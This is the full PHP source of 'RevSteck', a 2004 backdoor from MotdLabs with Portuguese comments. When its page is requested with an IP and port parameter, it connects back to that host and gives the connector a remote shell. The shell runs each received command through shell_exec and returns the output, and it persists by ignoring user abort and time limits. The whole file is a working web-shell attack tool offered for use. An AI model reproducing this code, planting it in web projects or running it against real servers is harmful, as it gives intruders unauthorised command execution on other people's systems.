<?php
/*  ____________________________________________________________________
   | RevSteck - BackDoor em php, utilizando connect-back                |
   | Copyright (C) 2004 tDs - tds@motdlabs.org   motdlabs.org           |
   |....................................................................|
   | vars_ini = rst_                                                    |
   | func_ini = RST_                                                    |
   |....................................................................|
   | Este programa � software livre; voc� pode redistribu�-lo e/ou      |
   | modific�-lo sob os termos da Licen�a P�blica Geral GNU, conforme   |
   | publicada pela Free Software Foundation; tanto a vers�o 2 da       |
   | Licen�a como (a seu crit�rio) qualquer vers�o mais nova.           |
   +====================================================================+
*/

/***
 Funcao que ira criar a backdoor.
 Nao recebe nenhum parametro, mas precisa de duas variaveis setadas ao
 acessar o endereco dela. Verifique em INFO.TXT quais sao estas variaveis.
*/
function RST_revsteck () 
{
    
    define ('_REVSTECK_DEBUG_', true);
    define ('_REVSTECK_SECURE_', false);
    define ('_REVSTECK_VERSION_','0.2');
    define ('_REVSTECK_MSG_SHELL_', 'revsteck@MotdLabs:');
    
    /*** fputs modificado. codifica dados, se necessario */
    function RST_fputs ($rst_fd, $rst_cont, $rst_len) {
        if (_REVSTECK_SECURE_ == true) {
            $rst_cont = base64_encode ($rst_cont);
            $rst_send = fputs ($rst_fd, $rst_cont, $rst_len);
            return ($rst_send);
        } else {
            $rst_send = fputs ($rst_fd, $rst_cont, $rst_len);
            return ($rst_send);
        }
    }
    
    /*** fgets modificado. decodifica dados, se necessario */
    function RST_fgets ($rst_fd, $rst_len) {
        if (_REVSTECK_SECURE_ == true) {
            $rst_get = fgets ($rst_fd, $rst_len);
            $rst_get = base64_decode ($rst_get);
            return ($rst_get);
        } else {
            $rst_get = fgets ($rst_fd, $rst_len);
            return ($rst_get);
        }
    }
    
    /*** verifica os requisitos para execucao da backdoor */
    function RST_verperms ($rst_fd)
    {
        $rst_info = '';
        if (get_cfg_var ('safe_mode')) {
            $rst_info .= "SAFE MODE ATIVADO.\n\r";
        }
        if (!function_exists ('shell_exec')) {
            $rst_info .= "SHELL_EXEC DESATIVADO.\n\r";
        }
        if ($rst_info) {
            $rst_info .= "RevSteck nao funcionara corretamente.\n\r";
            RST_fputs ($rst_fd, $rst_info, strlen ($rst_info));
        }
        return (0);
    }
    
    function RST_shellmsg ()
    {
        $rst_msg  = _REVSTECK_MSG_SHELL_;
        $rst_msg .= shell_exec ('pwd');
        $rst_msg  = str_replace ("\n", '', $rst_msg);
        $rst_msg  = str_replace ("\r", '', $rst_msg);
        $rst_msg .= '$'."\00";
        return ($rst_msg);
    }

    function RST_sendinfo ($rst_fd)
    {
        $rst_v   = _REVSTECK_VERSION_;
        $rst_str = 
                    "\033[1m".
                    "     _.-''''-._ \n\r".
                    "   .'          '. \n\r".
                    "  /   \033[34mX      X   \033[0;1m\ \n\r".
                    " | __          __ | \n\r".
                    " |  \          /  | \n\r".
                    "  \  '.      .'\ /  \n\r".
                    "   '.  '----'\_/' \n\r".
                    "     '-.____.-' \033[0m\n\r".
                    "     REVSTECK $rst_v - by tDs - \033[4;1;43m".
                    "MotdLabs.org\033[0m\n\r";
        sleep (2);
        $rst_info = 
                    "\n\033[2J\033[0;0H".
                    str_repeat ("'", 45).
                    "\n\r".$rst_str."\n\r";
        RST_fputs ($rst_fd, $rst_info, strlen ($rst_info));
        RST_verperms ($rst_fd);
        $rst_info = str_repeat ("'", 45)."\n\r".RST_shellmsg ();
        RST_fputs ($rst_fd, $rst_info, strlen ($rst_info));
    }
    
    if (_REVSTECK_DEBUG_ == true) {
        error_reporting (E_ALL ^ E_NOTICE);
    } else {
        error_reporting (0);
    }
    
    set_time_limit (0);
    ignore_user_abort (1);
    ob_implicit_flush ();
    
    $rst_host  = $_REQUEST['rst_ip'];
    $rst_porta = $_REQUEST['rst_po'];
    
    if (!$rst_host) {
        $rst_host = $_SERVER['REMOTE_ADDR'];
    }
    if (!$rst_porta) {
        die ('Porta nao informada.');
    }
   
    if (!function_exists ('fsockopen')) { 
        die ('funcao fsockopen() desativada.');
    }
    
    $rst_con = fsockopen ($rst_host, $rst_porta, $rst_errno, $rst_errstr, 1);
    
    if (!$rst_con) {
        echo 'Erro na linha '.__LINE__.': '.$rst_errstr.'  ';
        echo $rst_errno."<br>\n\r";
        die;
    } 
    RST_sendinfo ($rst_con);
    $rst_flag = 1;
    
    while ($rst_flag) {
        $rst_buf = RST_fgets ($rst_con, 1024);
        if (!$rst_buf = trim ($rst_buf)) { continue; }
    
        /*** sair da backdoor*/
        if ($rst_buf == 'exit') { 
            unset ($rst_flag); 
            break; 
        } 
    
        /*** mudanca de diretorio e' tratada de forma diferente */
        if ((substr_count ($rst_buf, 'cd')) && (strpos ($rst_buf, ' ') == 2)) {
            $rst_exe = chdir (str_replace ('cd ', '', $rst_buf));
        } else {
            if ((substr_count ($rst_buf, 'ls')) 
                                        && ((strpos ($rst_buf, ' ') == 2) ||
                                             strlen ($rst_buf) == 2)) {
                $rst_buf .= ' -h --color=always';
            } 
            $rst_buf .= ' 2>&1';
            $rst_exe  = shell_exec ($rst_buf);
            $rst_exe  = str_replace ("\n", "\n\r", $rst_exe);
        
            if (_REVSTECK_DEBUG_ == 1) {
                echo $rst_buf.'<br>'.nl2br ($rst_exe).'<br><hr>';
            }
            RST_fputs ($rst_con, $rst_exe, strlen ($rst_exe));
        }
               
        $rst_msgRet = RST_shellmsg();
        RST_fputs ($rst_con, $rst_msgRet, strlen ($rst_msgRet));
    }        
    fclose ($rst_con);
    
}
RST_revsteck ();
?>
